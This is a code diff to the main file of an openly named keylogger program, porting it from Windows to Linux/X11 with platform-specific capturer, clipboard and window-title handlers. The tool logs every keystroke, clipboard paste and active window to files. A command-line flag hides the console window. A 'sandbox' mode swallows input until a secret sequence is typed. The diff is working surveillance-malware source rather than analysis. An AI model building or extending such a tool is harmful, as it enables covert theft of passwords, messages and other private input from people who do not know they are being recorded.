@@ -1,32 +1,60 @@
-#include "ClipboardHandlerWindows.h"
 #include "FileLogger.h"
-#include "KeycodeMapperUS.h"
-#include "KeystrokeCapturerWindows.h"
 #include "SandboxListener.h"
 #include "StdoutLogger.h"
-#include "WindowHandlerWindows.h"
+
+#ifdef _WIN32
+    #include "KeycodeMapperEnUs.h"
+
+    #include "ClipboardHandlerWindows.h"
+    #include "KeystrokeCapturerWindows.h"
+    #include "WindowHandlerWindows.h"
+#elif defined(__linux__)
+    #include "KeycodeMapperEnUsX11.h"
+
+    #include "ClipboardHandlerLinuxX11.h"
+    #include "KeystrokeCapturerLinuxX11.h"
+    #include "WindowHandlerLinuxX11.h"
+
+    #include <X11/Xlib.h>
+#endif
 
 #include "getopt.h"
 
+#include <chrono>
 #include <iostream>
 #include <thread>
-#include <windows.h>
+
+#ifdef _WIN32
+    #include <windows.h>
+#else
+    #include <unistd.h>
+#endif
 
 Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
-    if (mapper == "us") {
-        return new Keylogger::KeycodeMapperUS();
+    if (mapper == "en-us") {
+    #ifdef __linux__
+        return new Keylogger::KeycodeMapperEnUsX11();
+    #else
+        return new Keylogger::KeycodeMapperEnUs();
+    #endif
     }
     return nullptr;
 }
 
+void sleep_ms(unsigned int ms) {
+    std::this_thread::sleep_for(std::chrono::milliseconds(ms));
+}
+
 void hideConsole() {
+#ifdef _WIN32
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+#endif
 }
 
 void printSandboxState(Keylogger::SandboxListener* sandbox) {
     while (true) {
         std::cout << std::endl << "Type '" << sandbox->getExitSeq(true) << "' to exit the sandbox." << std::endl;
-        Sleep(1000);
+        sleep_ms(1000);
     }
 }
 
@@ -49,7 +77,7 @@ options:\n\
   -c, --clipboard        enable clipboard paste logging\n\
   -h, --help             shows this help menu\n\
   -k, --keycodes         log keycodes pressed/released\n\
-  -m, --mapper [name]    use this keycode mapper (default 'us')\n\
+  -m, --mapper [name]    use this keycode mapper (default 'en-us')\n\
   -o, --output [file]    output to this file\n\
   -s, --sandbox          capture key presses without passing them through\n\
                            until the correct sequence is typed, then exit\n\
@@ -57,12 +85,12 @@ options:\n\
   -z, --hidden           hide the console window\n\
 \n\
 available keycode maps:\n\
-  us    US keyboard\n\
+  en-us    US keyboard\n\
 ";
 
     srand(time(0));
 
-    Keylogger::IKeycodeMapper* mapper = new Keylogger::KeycodeMapperUS();
+    Keylogger::IKeycodeMapper* mapper = getMapperByStr("en-us");
     std::string logName = "log";
 
     bool clipboardEnable = false;
@@ -108,46 +136,56 @@ available keycode maps:\n\
         }
     }
 
-    Keylogger::ClipboardHandlerWindows clipboard;
-    Keylogger::WindowHandlerWindows window;
+    Keylogger::IClipboardHandler* clipboard = nullptr;
+    Keylogger::IKeystrokeCapturer* capturer = nullptr;
+    Keylogger::IWindowHandler* window = nullptr;
 
     Keylogger::FileLogger loggerBin;
     Keylogger::FileLogger logger;
     Keylogger::StdoutLogger loggerStdout;
 
-    Keylogger::KeystrokeCapturerWindows capturer;
+#ifdef _WIN32
+    clipboard = new Keylogger::ClipboardHandlerWindows();
+    capturer = new Keylogger::KeystrokeCapturerWindows();
+    window = new Keylogger::WindowHandlerWindows();
+#elif __linux__
+    XInitThreads();
+    clipboard = new Keylogger::ClipboardHandlerLinuxX11();
+    capturer = new Keylogger::KeystrokeCapturerLinuxX11();
+    window = new Keylogger::WindowHandlerLinuxX11();
+#endif
 
     if (keycodesLog) {
         loggerBin.open(
             nullptr,
-            clipboardEnable ? &clipboard : nullptr,
-            windowEnable ? &window : nullptr,
+            clipboardEnable ? clipboard : nullptr,
+            windowEnable ? window : nullptr,
             logName + ".bin"
         );
-        capturer.addLogger(&loggerBin);
+        capturer->addLogger(&loggerBin);
     }
 
     logger.open(
         mapper,
-        clipboardEnable ? &clipboard : nullptr,
-        windowEnable ? &window : nullptr,
+        clipboardEnable ? clipboard : nullptr,
+        windowEnable ? window : nullptr,
         logName + ".txt"
     );
-    capturer.addLogger(&logger);
+    capturer->addLogger(&logger);
 
-    capturer.start();
-    capturer.consumeKeystrokes(sandbox);
+    capturer->start();
+    capturer->consumeKeystrokes(sandbox);
 
     Keylogger::SandboxListener sandboxListener;
     std::thread* thr;
 
     if (sandbox) {
         loggerStdout.open(mapper);
-        capturer.addLogger(&loggerStdout);
+        capturer->addLogger(&loggerStdout);
 
         sandboxListener.start(mapper);
         thr = new std::thread(printSandboxState, &sandboxListener);
-        capturer.setCallback([&sandboxListener](int keycode, Keylogger::KeyState state) {
+        capturer->setCallback([&sandboxListener](int keycode, Keylogger::KeyState state) {
             if (state == Keylogger::KeyState::Pressed) {
                 if (sandboxListener.keycodeSent(keycode)) {
                     exit(0);
@@ -156,12 +194,18 @@ available keycode maps:\n\
         });
     }
 
+#ifdef _WIN32
     MSG msg;
     while (!GetMessage(&msg, NULL, NULL, NULL)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+#else
+    while (true) {
+        sleep_ms(100);
+    }
+#endif
 
-    capturer.stop();
+    capturer->stop();
     return 0;
 }
